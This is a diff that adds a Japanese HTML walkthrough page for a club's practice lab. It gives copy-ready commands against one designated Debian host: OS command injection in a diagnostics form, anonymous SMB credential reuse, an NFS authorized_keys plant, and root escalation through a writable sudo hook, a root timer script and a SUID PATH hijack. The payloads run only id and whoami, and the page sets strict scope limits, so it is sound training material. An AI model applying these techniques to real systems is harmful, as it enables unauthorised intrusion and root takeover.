@@ -1,0 +1,407 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="TSECHACLAB 風切モータース実践ラボの脆弱性、確認コマンド、CVE情報をまとめた部会用攻略リファレンス。"
+    />
+    <meta name="theme-color" content="#ffffff" />
+    <title>部会用攻略リファレンス | TSECHACLAB</title>
+    <link rel="stylesheet" href="/bukai/styles.css" />
+    <script src="/bukai/app.js" defer></script>
+  </head>
+  <body>
+    <a class="skip-link" href="#main-content">本文へ移動</a>
+
+    <header class="site-header">
+      <div class="header-inner">
+        <a class="brand" href="/bukai" aria-label="部会用攻略リファレンス トップ">
+          <span class="brand-org">TSECHACLAB</span>
+          <span class="brand-title">部会用攻略リファレンス</span>
+        </a>
+        <a class="header-link" href="/lab">実践Labを開く</a>
+      </div>
+    </header>
+
+    <main id="main-content" tabindex="-1">
+      <div class="page-shell">
+        <nav class="breadcrumb" aria-label="パンくずリスト">
+          <ol>
+            <li><a href="/lab">実践Lab</a></li>
+            <li aria-current="page">攻略リファレンス</li>
+          </ol>
+        </nav>
+
+        <div class="page-heading">
+          <p class="shoulder">風切モータース実践ラボ</p>
+          <h1>攻略中に引く、部会用リファレンス</h1>
+          <p class="lead">
+            入口の見つけ方、試すコマンド、権限昇格の観察点を一か所にまとめています。
+            Labとは通信せず、進行状況も保存しません。
+          </p>
+        </div>
+
+        <section class="scope-notice" aria-labelledby="scope-title">
+          <h2 id="scope-title">利用できる範囲</h2>
+          <p>
+            運営者が指定した直結Debian <code>10.13.37.10</code> だけに使用してください。
+            想定外のIP、経路、ポートが見えた場合は操作を止めます。
+          </p>
+          <p>
+            現在、実機9経路の物理検証は未完了です。このページはリポジトリ上の設計とfixtureを参照した手順であり、実機成功済みという意味ではありません。
+          </p>
+        </section>
+
+        <section class="finder" aria-labelledby="finder-title">
+          <h2 id="finder-title">必要な情報を絞り込む</h2>
+          <div class="finder-grid">
+            <div class="search-field">
+              <label for="reference-search">脆弱性名、コマンド、用語で検索</label>
+              <input
+                id="reference-search"
+                type="search"
+                inputmode="search"
+                autocomplete="off"
+                placeholder="例: smbclient、sudo、PATH"
+              />
+            </div>
+            <fieldset class="filter-field">
+              <legend>攻略段階</legend>
+              <div class="filter-options">
+                <label><input type="radio" name="kind" value="all" checked /> すべて</label>
+                <label><input type="radio" name="kind" value="entry" /> 初期侵入</label>
+                <label><input type="radio" name="kind" value="root" /> 権限昇格</label>
+              </div>
+            </fieldset>
+          </div>
+          <p id="result-count" class="result-count" aria-live="polite">6件を表示しています</p>
+        </section>
+
+        <div class="document-layout">
+          <aside class="page-index" aria-labelledby="index-title">
+            <h2 id="index-title">このページの目次</h2>
+            <nav aria-label="ページ内目次">
+              <ol>
+                <li><a href="#recon">最初の接続確認</a></li>
+                <li><a href="#web">Web診断</a></li>
+                <li><a href="#smb">匿名SMB</a></li>
+                <li><a href="#nfs">NFS所有者マッピング</a></li>
+                <li><a href="#sudo">sudo保守hook</a></li>
+                <li><a href="#timer">root timer</a></li>
+                <li><a href="#suid">SUID PATH</a></li>
+                <li><a href="#finish">root確認後</a></li>
+              </ol>
+            </nav>
+          </aside>
+
+          <div class="document-body">
+            <section id="recon" class="recon-section" aria-labelledby="recon-title">
+              <h2 id="recon-title">最初の接続確認</h2>
+              <p>
+                入口を決める前に、Kaliの有線IP、経路、標的が公開しているサービスを事実として並べます。
+                入口として期待するポートは <code>22</code>、<code>80</code>、<code>445</code>、<code>2049</code> です。
+              </p>
+              <div class="command-list">
+                <div class="command-row">
+                  <span class="role-label">[Kali]</span>
+                  <pre><code>ip address</code></pre>
+                  <button class="copy-button" type="button">コピー</button>
+                </div>
+                <div class="command-row">
+                  <span class="role-label">[Kali]</span>
+                  <pre><code>ip route</code></pre>
+                  <button class="copy-button" type="button">コピー</button>
+                </div>
+                <div class="command-row">
+                  <span class="role-label">[Kali]</span>
+                  <pre><code>ping -c 1 10.13.37.10</code></pre>
+                  <button class="copy-button" type="button">コピー</button>
+                </div>
+                <div class="command-row">
+                  <span class="role-label">[Kali]</span>
+                  <pre><code>nmap -sV -Pn -p 22,80,445,2049 10.13.37.10</code></pre>
+                  <button class="copy-button" type="button">コピー</button>
+                </div>
+              </div>
+            </section>
+
+            <section class="reference-list" aria-labelledby="entry-title">
+              <h2 id="entry-title">初期侵入の入口</h2>
+
+              <article id="web" class="reference-item" data-kind="entry">
+                <header class="item-heading">
+                  <span class="category-label">初期侵入</span>
+                  <h3>Web診断のOSコマンドインジェクション</h3>
+                </header>
+                <dl class="fact-list">
+                  <div><dt>脆弱性</dt><dd>入力値をshell commandへ連結する独自PHP実装</dd></div>
+                  <div><dt>CVE</dt><dd><strong>CVEなし</strong>。既知製品の脆弱性ではありません。</dd></div>
+                  <div><dt>成功の目印</dt><dd>診断結果に <code>www-data</code> のUIDが表示されます。</dd></div>
+                </dl>
+                <details>
+                  <summary>Web診断で入力境界を確認する</summary>
+                  <div class="details-body">
+                    <p>
+                      KaliのFirefoxで <a href="http://10.13.37.10/staff/diagnostics.php">スタッフ用診断画面</a>
+                      を開き、通常の入力と区切り記号を含む入力の差を比べます。
+                    </p>
+                    <div class="command-list">
+                      <div class="command-row">
+                        <span class="role-label">[Kaliブラウザ]</span>
+                        <pre><code>127.0.0.1</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[Kaliブラウザ]</span>
+                        <pre><code>127.0.0.1; id</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                    </div>
+                    <p class="note">
+                      Web入口から標的内コマンドを試す場合は、同じ診断欄で
+                      <code>127.0.0.1; &lt;試すコマンド&gt;</code> の形にします。
+                    </p>
+                  </div>
+                </details>
+              </article>
+
+              <article id="smb" class="reference-item" data-kind="entry">
+                <header class="item-heading">
+                  <span class="category-label">初期侵入</span>
+                  <h3>匿名SMB共有と資格情報の再利用</h3>
+                </header>
+                <dl class="fact-list">
+                  <div><dt>脆弱性</dt><dd>guest read許可と、演習用sales資格情報の残置・再利用</dd></div>
+                  <div><dt>CVE</dt><dd><strong>CVEなし</strong>。Sambaの製品脆弱性ではありません。</dd></div>
+                  <div><dt>成功の目印</dt><dd>SSH先の <code>whoami</code> が <code>sales</code> になります。</dd></div>
+                </dl>
+                <details>
+                  <summary>handover共有からsales接続まで確認する</summary>
+                  <div class="details-body">
+                    <p>
+                      匿名で読める引き継ぎ文書だけを確認します。文書内の演習用パスワードは対話入力し、このサイトや証跡へ保存しません。
+                    </p>
+                    <div class="command-list">
+                      <div class="command-row">
+                        <span class="role-label">[Kali]</span>
+                        <pre><code>smbclient //10.13.37.10/handover -N</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[Kali / smbclient内]</span>
+                        <pre><code>ls
+get SHIFT-HANDOVER.txt</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[Kali]</span>
+                        <pre><code>ssh sales@10.13.37.10</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>whoami</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                    </div>
+                  </div>
+                </details>
+              </article>
+
+              <article id="nfs" class="reference-item" data-kind="entry">
+                <header class="item-heading">
+                  <span class="category-label">初期侵入</span>
+                  <h3>NFS所有者マッピング不備からmechanicへ接続</h3>
+                </header>
+                <dl class="fact-list">
+                  <div><dt>脆弱性</dt><dd>NFSv4の書き込み先をmechanicのSSH領域へ固定するexport設定</dd></div>
+                  <div><dt>CVE</dt><dd><strong>CVEなし</strong>。NFSの製品脆弱性ではありません。</dd></div>
+                  <div><dt>成功の目印</dt><dd>SSH先の <code>whoami</code> が <code>mechanic</code> になります。</dd></div>
+                </dl>
+                <details>
+                  <summary>NFSv4をmountしてmechanic接続を確認する</summary>
+                  <div class="details-body">
+                    <p>
+                      このLabはNFSv4-onlyです。<code>showmount</code> は使わず、公開rootを直接mountします。
+                    </p>
+                    <div class="command-list">
+                      <div class="command-row">
+                        <span class="role-label">[Kali]</span>
+                        <pre><code>sudo mkdir -p /mnt/workshop
+sudo mount -t nfs4 -o vers=4,proto=tcp 10.13.37.10:/ /mnt/workshop
+ls -la /mnt/workshop</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[Kali]</span>
+                        <pre><code>ssh-keygen -t ed25519 -f ~/.ssh/bukai-mechanic -N ''
+sudo install -m 600 ~/.ssh/bukai-mechanic.pub /mnt/workshop/authorized_keys</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[Kali]</span>
+                        <pre><code>ssh -i ~/.ssh/bukai-mechanic mechanic@10.13.37.10</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>whoami</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                    </div>
+                  </div>
+                </details>
+              </article>
+            </section>
+
+            <section class="reference-list" aria-labelledby="root-title">
+              <h2 id="root-title">権限昇格の経路</h2>
+              <p class="section-intro">
+                3つのfootholdはすべて同じ <code>lab-foothold</code> groupに入り、以下の3経路を選べます。
+              </p>
+
+              <article id="sudo" class="reference-item" data-kind="root">
+                <header class="item-heading">
+                  <span class="category-label">権限昇格</span>
+                  <h3>sudo保守helperが共同編集hookをroot実行</h3>
+                </header>
+                <dl class="fact-list">
+                  <div><dt>脆弱性</dt><dd>NOPASSWD helperの二次信頼先がgroup書き込み可能</dd></div>
+                  <div><dt>CVE</dt><dd><strong>CVEなし</strong>。custom helperとsudoersの設定不備です。</dd></div>
+                  <div><dt>成功の目印</dt><dd>hook内の <code>id</code> が <code>uid=0(root)</code> を返します。</dd></div>
+                </dl>
+                <details>
+                  <summary>sudoの許可とhookの書き込み権限をたどる</summary>
+                  <div class="details-body">
+                    <div class="command-list">
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>sudo -l
+ls -ld /srv/kazekiri/maintenance-hooks
+sed -n '1,80p' /usr/local/sbin/kazekiri-maintenance</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>printf '#!/bin/sh\nid\nwhoami\nhead -c 1 /root/ROOT.flag &gt;/dev/null\n' &gt; /srv/kazekiri/maintenance-hooks/bukai.sh
+sudo /usr/local/sbin/kazekiri-maintenance /srv/kazekiri/maintenance-hooks/bukai.sh</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                    </div>
+                  </div>
+                </details>
+              </article>
+
+              <article id="timer" class="reference-item" data-kind="root">
+                <header class="item-heading">
+                  <span class="category-label">権限昇格</span>
+                  <h3>group-writable payloadをroot timerが実行</h3>
+                </header>
+                <dl class="fact-list">
+                  <div><dt>脆弱性</dt><dd>実行者rootとpayload編集者lab-footholdの分離不備</dd></div>
+                  <div><dt>CVE</dt><dd><strong>CVEなし</strong>。systemdの製品脆弱性ではありません。</dd></div>
+                  <div><dt>成功の目印</dt><dd>次回実行後のproof fileに <code>uid=0(root)</code> が残ります。</dd></div>
+                </dl>
+                <details>
+                  <summary>timerから書き換え可能なpayloadまでたどる</summary>
+                  <div class="details-body">
+                    <div class="command-list">
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>systemctl list-timers --all | grep open-world-root-timer
+systemctl cat open-world-root-timer.service
+ls -l /opt/kazekiri/maintenance/nightly.sh</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>printf '#!/bin/sh\nid &gt; /tmp/bukai-timer-root.txt\nhead -c 1 /root/ROOT.flag &gt;/dev/null\n' &gt; /opt/kazekiri/maintenance/nightly.sh
+systemctl list-timers open-world-root-timer.timer</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian / 次回実行後]</span>
+                        <pre><code>cat /tmp/bukai-timer-root.txt</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                    </div>
+                    <p class="note">timer間隔は約3分です。待機中に別の対象や外部ネットワークへ探索範囲を広げません。</p>
+                  </div>
+                </details>
+              </article>
+
+              <article id="suid" class="reference-item" data-kind="root">
+                <header class="item-heading">
+                  <span class="category-label">権限昇格</span>
+                  <h3>教材用SUID helperのunsafe PATH解決</h3>
+                </header>
+                <dl class="fact-list">
+                  <div><dt>脆弱性</dt><dd>root SUID binaryがrendererを絶対pathでなく検索</dd></div>
+                  <div><dt>CVE</dt><dd><strong>CVEなし</strong>。training-only custom binaryの実装不備です。</dd></div>
+                  <div><dt>成功の目印</dt><dd>差し替えたrendererの <code>id</code> が <code>uid=0(root)</code> を返します。</dd></div>
+                </dl>
+                <details>
+                  <summary>SUID bitとPATHから探す実行名を結びつける</summary>
+                  <div class="details-body">
+                    <div class="command-list">
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>ls -l /usr/local/bin/kazekiri-report
+strings /usr/local/bin/kazekiri-report | grep renderer</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>mkdir -p /tmp/bukai-path
+printf '#!/bin/sh\nid\nwhoami\nhead -c 1 /root/ROOT.flag &gt;/dev/null\n' &gt; /tmp/bukai-path/kazekiri-report-render
+chmod 755 /tmp/bukai-path/kazekiri-report-render</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                      <div class="command-row">
+                        <span class="role-label">[標的Debian]</span>
+                        <pre><code>PATH=/tmp/bukai-path:/usr/local/libexec:/usr/bin:/bin /usr/local/bin/kazekiri-report</code></pre>
+                        <button class="copy-button" type="button">コピー</button>
+                      </div>
+                    </div>
+                  </div>
+                </details>
+              </article>
+            </section>
+
+            <section id="finish" class="finish-section" aria-labelledby="finish-title">
+              <h2 id="finish-title">root確認後</h2>
+              <p>
+                <code>uid=0(root)</code> を確認したら追加操作を止めます。侵害済みDebian内のcleanupやresetは信頼せず、
+                次の経路へ進む前に運営者が信頼済み外部mediaからfresh restoreします。
+              </p>
+              <ul>
+                <li>flag本文、生成された資格情報、terminal historyを証跡へ残さない</li>
+                <li>会社LAN、インターネット、第三者システムを対象にしない</li>
+                <li>想定外のroute、DNS、forwarding、NATを検出したらLAN cableを抜く</li>
+              </ul>
+            </section>
+
+            <p id="empty-result" class="empty-result" hidden>
+              該当する項目はありません。検索語を短くするか、「すべて」を選んでください。
+            </p>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <div class="footer-inner">
+        <p>TSECHACLAB 部会用攻略リファレンス</p>
+        <p>
+          UI設計の参照:
+          <a href="https://design.digital.go.jp/dads/">デジタル庁デザインシステムβ版</a>
+        </p>
+        <p>最終更新: 2026年8月20日</p>
+      </div>
+    </footer>
+
+    <div id="copy-status" class="visually-hidden" role="status" aria-live="polite"></div>
+  </body>
+</html>
